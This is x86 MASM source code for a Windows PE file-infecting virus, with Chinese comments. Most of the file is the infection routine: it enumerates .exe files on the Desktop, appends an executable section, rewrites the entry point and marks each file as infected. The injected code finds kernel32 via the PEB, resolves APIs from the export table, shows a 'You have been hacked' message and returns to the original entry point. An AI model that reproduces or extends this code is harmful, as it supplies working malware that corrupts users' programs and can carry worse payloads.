.586

.model  flat, stdcall

option  casemap:none

include         windows.inc 
include         kernel32.inc
includelib      kernel32.lib
include         user32.inc
includelib      user32.lib

PEGame SEGMENT 
fd WIN32_FIND_DATA <>
Dsektop   db 'C:/Users/xxx/Desktop/',0         ;修改xxx为对应用户名
dot       db '.',0 
FilePath  db 260 dup(?);  
handle    dd 0
sPath     db 'C:/Users/xxx/Desktop/*.exe',0    ;修改xxx为对应用户名
sTitle    db 'By Alex', 0
sMessage  db 'Infected Success!',0

start:
        invoke  FindFirstFileA,offset sPath,offset fd
        mov handle, eax
        cmp handle, INVALID_HANDLE_VALUE
        jz	Exit0
Check:
        invoke  lstrcmp,offset dot,offset fd.cFileName[0]
        jz	FindNextDir
        and fd.dwFileAttributes, FILE_ATTRIBUTE_DIRECTORY
        jnz	start
        invoke  lstrcpy,offset FilePath,offset Dsektop
        cmp eax, 0
        jz  Exit0
        invoke  lstrcat,offset FilePath,offset fd.cFileName
        push    offset FilePath
        call    InfectFile
        invoke  RtlZeroMemory,offset FilePath,260
        invoke  lstrcpy,offset FilePath,offset Dsektop
FindNextDir:
        invoke	 FindNextFileA,handle,offset fd
        cmp eax, 0
        jz  Exit0
        jmp Check
Exit0:
        cmp handle, INVALID_HANDLE_VALUE
        jnz CloseFind
        ret 
CloseFind:
        invoke FindClose,offset handle
        mov handle, 0
        ret

InfectFile PROC FileName : DWORD

       LOCAL   hFile    : DWORD

       LOCAL   hMapping : DWORD

       LOCAL   pMapping : DWORD

       LOCAL   ByteWrite: DWORD

       pushad

       push   NULL 

       push   FILE_ATTRIBUTE_NORMAL

       push   OPEN_EXISTING 

       push   NULL 

       push   FILE_SHARE_READ+FILE_SHARE_WRITE

       push   GENERIC_READ+GENERIC_WRITE 

       push   FileName

       call   CreateFile            

       cmp    eax,-1

       jz     IF_Exit

       mov    hFile,eax 

       

       xor    edi , edi         ;节约空间

       push   edi 

       push   edi

       push   edi

       push   PAGE_READWRITE 

       push   edi

       push   hFile

       call   CreateFileMapping        

       or     eax,eax

       jz     IF_F3

       mov    hMapping , eax 

 

       push   edi              ;edi=0

       push   edi

       push   edi                  

       push   FILE_MAP_READ+FILE_MAP_WRITE 

       push   hMapping

       call   MapViewOfFile                

       or     eax,eax

       jz     IF_F2             

       mov    pMapping,eax             

       mov    esi,eax 

      

       assume esi:ptr IMAGE_DOS_HEADER 

       cmp    [esi].e_magic,IMAGE_DOS_SIGNATURE   

       jnz    IF_F1     

       add    esi,[esi].e_lfanew

       assume esi:ptr IMAGE_NT_HEADERS

       cmp    [esi].Signature,IMAGE_NT_SIGNATURE    ;是PE文件吗？

       jnz    IF_F1

       cmp    [esi].OptionalHeader.CheckSum,0 ;避免感染!0的文件

       jnz    IF_F1                    ;合法性判断完毕，开始感染

       cmp    word ptr [esi+1ah],0815h ;设置感染标志

       jz     IF_F1

                  

       mov  eax,[esi].OptionalHeader.AddressOfEntryPoint 

       add  eax,[esi].OptionalHeader.ImageBase 

       mov  OEP,eax                    ;保存原入口 

 

       movzx  eax,[esi].FileHeader.NumberOfSections         

       mov    ecx,sizeof IMAGE_SECTION_HEADER 

       mul    ecx

       add    eax,sizeof IMAGE_NT_HEADERS                

       add    eax,esi

       mov    edi,eax

       add    eax,sizeof IMAGE_SECTION_HEADER

       sub    eax,pMapping                       

       cmp    eax,[esi].OptionalHeader.SizeOfHeaders 

       ja     IF_F1 

 

;*****************************************

;空间允许, ^0^,edi指向新节

;***************************************** 

 

       inc    [esi].FileHeader.NumberOfSections       

               

       assume edi:ptr IMAGE_SECTION_HEADER         

       mov    dword ptr[edi],'cvc.'         ;Name

       

       push   VEnd-VStart

       pop    [edi].Misc.VirtualSize        ;VirtualSize

     

       lea    eax,[edi-28h].VirtualAddress  ;prev VirtualAddress

       mov    ebx,[eax]

       lea	  ecx,[edi-28h].Misc.VirtualSize

       mov    eax,[ecx]    

       mov    ecx,[esi].OptionalHeader.SectionAlignment

       div    ecx

       inc    eax 

       mul    ecx

       add    eax,ebx

       mov    [edi].VirtualAddress,eax         ;VirtualAddress      

              

       mov    eax,[edi].Misc.VirtualSize

       mov    ecx,[esi].OptionalHeader.FileAlignment

       div    ecx

       inc    eax

       mul    ecx

       mov    [edi].SizeOfRawData,eax        ;SizeOfRawData

 

       lea    eax,[edi-28h+14h]              ;prev PointerToRawData 

       mov    eax,[eax]

       lea    ecx,[edi-28h+10h]              ;prev SizeOfRawData 

       add    eax,[ecx]

       mov    [edi].PointerToRawData,eax     ;PointerToRawData

       mov    [edi].Characteristics,0E0000020h  ;可读可写可执行 

 

;***************************************************************

;更新SizeOfImage,AddressOfEntryPoint,使新节可以正确加载并首先执行 

;***************************************************************

       push  [edi].VirtualAddress

       pop   [esi].OptionalHeader.AddressOfEntryPoint

       

       mov   eax,[edi].Misc.VirtualSize 

       mov   ecx,[esi].OptionalHeader.SectionAlignment 

       div   ecx 

       inc   eax 

       mul   ecx 

       add   eax,[esi].OptionalHeader.SizeOfImage 

       mov   [esi].OptionalHeader.SizeOfImage,eax 

       mov   word ptr [esi+1ah],0815h   ;写入感染标志                 

 

       push     FILE_BEGIN

       push     0 

       push     [edi].PointerToRawData 

       push     hFile

       call     SetFilePointer

               

;****************************************************************

;设置文件指针到结尾后，写入从VStart开始的代码，大小经过文件对齐 

;****************************************************************

       push    0

       lea     eax,ByteWrite

       push    eax

       push    [edi].SizeOfRawData

       push    offset VStart

       push    hFile

       call    WriteFile  

       

IF_F1:

      push    pMapping

      call    UnmapViewOfFile        

IF_F2:

      push    hMapping

      call    CloseHandle

IF_F3:

      push    hFile

      call    CloseHandle

IF_Exit: 

      popad

      ret  4

InfectFile ENDP       

 

;*************************************************************** 

;从VStart->VEnd是将插入到e:\test\m.exe的代码 

;功能是弹出一个对话框，然后返回原入口执行 

;*************************************************************** 


VStart: 

      call  delta

delta: 

      pop     ebp                             ;得到delta地址
      sub     ebp, offset delta                ;因为在其他程序中基址可能不是默认的所以需要重定位
      mov     dword ptr [ebp+offset appBase],ebp 
getK32Base:
      push esi
		  xor eax, eax
		  assume fs:nothing
		  mov eax, DWORD ptr fs:[30h]
		  mov eax, DWORD ptr [eax+0ch]
	  	mov esi, DWORD ptr [eax+1ch]
	  	lodsd
		  mov eax, DWORD ptr [eax]
		  mov eax, DWORD ptr [eax+8h]
	  	pop esi
      mov     [ebp+offset k32Base],eax        ;如果是,就认为找到kernel32的Base值
      lea     edi, [ebp+offset aGetModuleHandle]
      lea     esi, [ebp+offset lpApiAddrs]
lop_get:
      add     DWORD ptr [esi], ebp
      lodsd
      cmp     eax, ebp
      jz      End_Get
      push    eax
      push    dword ptr [ebp+offset k32Base]
      call    GetApiA                         ;获取API地址
      stosd
      jmp     lop_get
End_Get:
      lea     eax, offset u32
      add     eax, ebp
      push    eax
      call    dword ptr [ebp+offset aLoadLibrary]     ;在程序空间加载User32.dll
      lea     EDX,[EBP+OFFSET sMessageBoxA]
      push    edx
      push    eax
      mov     eax,dword ptr [ebp+aGetProcAddress]     ;用GetProcAddress获得MessageBoxA的地址
      call    eax                                     ;调用GetProcAddress 
      push    40h+1000h    									;style
      lea     ebx, offset sztit								;title
      add     ebx, ebp
      push    ebx
      lea     ebx, offset szMsg0								;消息内容
      add     ebx, ebp
      push    ebx                        
      push    0
      call    eax                                    	;MessageBox
      jmp     [EBP+offset OEP]								;回到原OEP                  
@@:                                                   
      push    0
      call    [ebp+aExitProcess]
;-----------------------------------------
K32_api_retrieve        proc    Base:DWORD ,sApi:DWORD 
      push    edx                     ;保存edx    
      xor     eax,eax                 ;此时esi=sApi
Next_Api:                               ;edi=AddressOfNames
      mov     esi,sApi
      xor     edx,edx
      dec     edx
Match_Api_name:
      mov     bl,byte  ptr [esi]
      inc     esi
      cmp     bl,0
      jz      foundit 
      inc     edx 
      push    eax
      mov     eax,dword ptr [edi+eax*4]         ;AddressOfNames的指针,递增
      add     eax,Base                ;注意是RVA,一定要加Base值
      cmp     bl,byte  ptr [eax+edx]  ;逐字符比较  
      pop     eax
      jz      Match_Api_name          ;继续搜寻
      inc     eax                     ;不匹配,下一个api
      loop    Next_Api
      jmp     no_exist                ;若全部搜完,即未存在
foundit:
      pop     edx                     ;edx=AddressOfNameOrdinals
      shl     eax,1                   ;*2得到AddressOfNameOrdinals的指针
      movzx   eax,word  ptr [edx+eax] ;eax返回指向AddressOfFunctions的指针
      ret
no_exist:
      pop     edx
      xor     eax,eax
      ret

K32_api_retrieve        endp
;----------------------------------------- 
GetApiA         proc    Base:DWORD,sApi:DWORD
      local    ADDRofFun:DWORD
      pushad
      mov     edi,Base
      add     edi,IMAGE_DOS_HEADER.e_lfanew
      mov     edi,DWORD ptr [edi]                       ;现在edi=off PE_HEADER
      add     edi,Base                        ;得到IMAGE_NT_HEADERS的偏移                         
      mov     ebx,edi
      mov     edi,[edi+IMAGE_NT_HEADERS.OptionalHeader.DataDirectory.VirtualAddress] 
      add     edi,Base                        ;得到edi=IMAGE_EXPORT_DIRECTORY入口
      mov     eax,DWORD ptr [edi+1ch]                   ;AddressOfFunctions的地址
      add     eax,Base
      mov     ADDRofFun,eax                   ;ecx=NumberOfNames
      mov     ecx,DWORD ptr [edi+18h]                   
      mov     edx,DWORD ptr [edi+24h]                   
      add     edx,Base                        ;edx=AddressOfNameOrdinals 
      mov     edi,DWORD ptr [edi+20h]
      add     edi,Base                        ;edi=AddressOfNames
      invoke K32_api_retrieve,Base,sApi
      mov     ebx,ADDRofFun
      shl     eax,2                           ;要*4才得到偏移
      add     eax,ebx
      mov     eax,[eax]
      add     eax,Base                        ;加上Base!
      mov     [esp+7*4],eax                   ;eax返回api地址
      popad
      ret
GetApiA         endp

appBase         dd ?
k32Base         dd ? 
lpApiAddrs      label   near
              dd      offset sGetModuleHandle
              dd      offset sGetProcAddress
              dd      offset sExitProcess
              dd      offset sLoadLibrary
              dd      0 

sGetModuleHandle       db "GetModuleHandleA",0
sGetProcAddress        db "GetProcAddress",0
sExitProcess           db "ExitProcess",0
sLoadLibrary           db "LoadLibraryA",0 
sMessageBoxA           db "MessageBoxA",0


aGetModuleHandle                dd 0
aGetProcAddress                 dd 0
aExitProcess                    dd 0
aLoadLibrary                    dd 0
aMessageBoxA                    dd 0 

u32                     db "User32.dll",0
k32                     db "Kernel32.dll",0 

sztit                   db "By Alex",0
szMsg0                  db "You have been hacked :D",0
OEP							dd 0

VEnd:

PEGame ends 

end    start 

